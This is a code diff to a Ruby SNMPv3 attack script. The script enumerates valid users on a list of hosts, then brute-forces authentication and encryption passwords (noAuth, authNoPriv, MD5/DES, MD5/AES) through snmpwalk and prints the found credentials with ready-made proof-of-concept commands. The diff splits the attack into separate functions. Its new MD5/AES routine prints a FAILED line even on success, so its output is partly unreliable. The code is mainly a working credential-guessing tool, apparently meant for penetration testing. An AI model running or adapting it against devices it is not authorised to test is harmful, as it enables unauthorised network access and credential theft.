@@ -32,11 +32,9 @@ def arguments
   opts
 end
 
-def findusers(arg, hostfile)
+def findusers(arg, hostfile, cmd)
   users = []
   userfile = File.readlines(arg[:users]).map(&:chomp)
-  log = Logger.new('userenum.log')
-  cmd = TTY::Command.new(output: log)
   
   puts "\nEnumerating SNMPv3 users".light_blue.bold
   hostfile.each do |host|
@@ -56,16 +54,14 @@ def findusers(arg, hostfile)
   if !users.empty?
   puts "\nValid Users:".green.bold
   puts users.to_table(:head => ['User', 'Host'])
-    users.each { |user| user.pop }.uniq!.flatten!
+    users.each { |user| user.pop }.uniq!.flatten!.sort!
   end
   users
 end
 
-def attack(arg, users, hostfile)
-  passwords = File.readlines(arg[:passlist]).map(&:chomp)
+def noauth(arg, users, hostfile, cmd)
+  results = []
   encryption_pass = File.readlines(arg[:enclist]).map(&:chomp)
-  log = Logger.new('attack.log')
-  cmd = TTY::Command.new(output: log)
 
   puts "\nTesting SNMPv3 without authentication and encryption".light_blue.bold
   hostfile.each do |host|
@@ -74,9 +70,16 @@ def attack(arg, users, hostfile)
         if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:/i
           puts "'#{user}' can connect without a password to host #{host}".green.bold
           puts "POC ---> snmpwalk -u #{user} #{host}".light_magenta
-        end
+          results << [user, host]
       end
     end
+  end
+  results
+end
+
+def authnopriv(arg, users, hostfile, passwords, cmd)
+  results = []
+  results << ["User", "Host", "Password"]
 
   puts "\nTesting SNMPv3 with authentication and without encryption".light_blue.bold
   hostfile.each do |host|
@@ -87,55 +90,78 @@ def attack(arg, users, hostfile)
             if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:/i
               puts "'#{user}' can connect with the password '#{password}'".green.bold
               puts "POC ---> snmpwalk -u #{user} -A #{password} #{host} -v3 -l authnopriv".light_magenta
-            end
+              results << [user, host, password]
           end
         end
       end
     end
+  end
+  results
+end
 
-  puts "\nTesting SNMPv3 with authentication and encryption".light_blue.bold
+def authpriv_md5des(arg, users, hostfile, passwords, cmd, cryptopass)
   valid = []
-  valid_md5aes = []
   valid << ["User", "Password", "Encryption", "Host"]
-  valid_md5aes << ["User", "Password", "Encryption", "Host"]
+
+  puts "\nTesting SNMPv3 with MD5 authentication and DES encryption".light_blue.bold
   hostfile.each do |host|
     users.each do |user|
       passwords.each do |password|
-        encryption_pass.each do |epass|
+        cryptopass.each do |epass|
           if epass.length >= 8 && password.length >= 8
             out, err = cmd.run!("snmpwalk -u #{user} -A #{password} -X #{epass} #{host} -v3 iso.3.6.1.2.1.1.1.0 -l authpriv", timeout: arg[:timeout])
               if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:/i
                 puts "FOUND: Username:'#{user}' Password:'#{password}' Encryption password:'#{epass}' Host:#{host}, MD5/DES".green.bold
                 puts "POC ---> snmpwalk -u #{user} -A #{password} -X #{epass} #{host} -v3 -l authpriv".light_magenta
                 valid << [user, password, epass, host]
-              elsif out !~ /iso.3.6.1.2.1.1.1.0 = STRING:/i
-                out, err = cmd.run!("snmpwalk -u #{user} -A #{password} -a MD5 -X #{epass} -x AES #{host} -v3 iso.3.6.1.2.1.1.1.0 -l authpriv", timeout: arg[:timeout])
-                if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:/i
-                puts "FOUND: Username:'#{user}' Password:'#{password}' Encryption password:'#{epass}' Host:#{host}, MD5/AES".green.bold
-                puts "POC ---> snmpwalk -u #{user} -A #{password} -a MD5 -X #{epass} -x AES #{host} -v3 -l authpriv".light_magenta
-                valid_md5aes << [user, password, epass, host]
-                  
               else
                 puts "FAILED: Username:'#{user}' Password:'#{password}' Encryption password:'#{epass}' Host:#{host}".red.bold
+            end
           end
         end
       end
     end
   end
+  valid
 end
+
+
+def authpriv_md5aes(arg, users, hostfile, passwords, cmd, cryptopass)
+  valid = []
+  valid << ["User", "Password", "Encryption", "Host"]
+
+  puts "\nTesting SNMPv3 with MD5 authentication and AES encryption".light_blue.bold
+  hostfile.each do |host|
+    users.each do |user|
+      passwords.each do |password|
+        cryptopass.each do |epass|
+          if epass.length >= 8 && password.length >= 8
+            out, err = cmd.run!("snmpwalk -u #{user} -A #{password} -a MD5 -X #{epass} -x AES #{host} -v3 iso.3.6.1.2.1.1.1.0 -l authpriv", timeout: arg[:timeout])
+                if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:/i
+                  puts "FOUND: Username:'#{user}' Password:'#{password}' Encryption password:'#{epass}' Host:#{host}, MD5/AES".green.bold
+                  puts "POC ---> snmpwalk -u #{user} -A #{password} -a MD5 -X #{epass} -x AES #{host} -v3 -l authpriv".light_magenta
+                  puts "FAILED: Username:'#{user}' Password:'#{password}' Encryption password:'#{epass}' Host:#{host}".red.bold
+                  valid << [user, password, epass, host]
+                else
+                puts "FAILED: Username:'#{user}' Password:'#{password}' Encryption password:'#{epass}' Host:#{host}".red.bold
+            end
+          end
+        end
+      end
+    end
+  end
+  valid
 end
-  if !valid[1].empty?
-    puts "\nValid Users - MD5/DES:".green.bold
-    puts valid.to_table(:first_row_is_head => true)
-  if !valid_md5aes[1].empty? 
-    puts "\nValid Users - MD5/AES:".green.bold
-    puts valid_md5aes.to_table(:first_row_is_head => true)
-end
-puts "Finished, please use this information and tool responsibly".green.bold
-end
-end
+
 
 arg = arguments
 hostfile = File.readlines(arg[:hosts]).map(&:chomp)
-users = findusers(arg, hostfile)
-attack(arg, users, hostfile)
+passwords = File.readlines(arg[:passlist]).map(&:chomp)
+cryptopass = File.readlines(arg[:enclist]).map(&:chomp)
+log = Logger.new('debug.log')
+cmd = TTY::Command.new(output: log)
+users = findusers(arg, hostfile, cmd)
+noauth(arg, users, hostfile, cmd)
+anp = authnopriv(arg, users, hostfile, passwords, cmd)
+ap = authpriv_md5des(arg, users, hostfile, passwords, cmd, cryptopass)
+authpriv_md5aes(arg, users, hostfile, passwords, cmd, cryptopass)
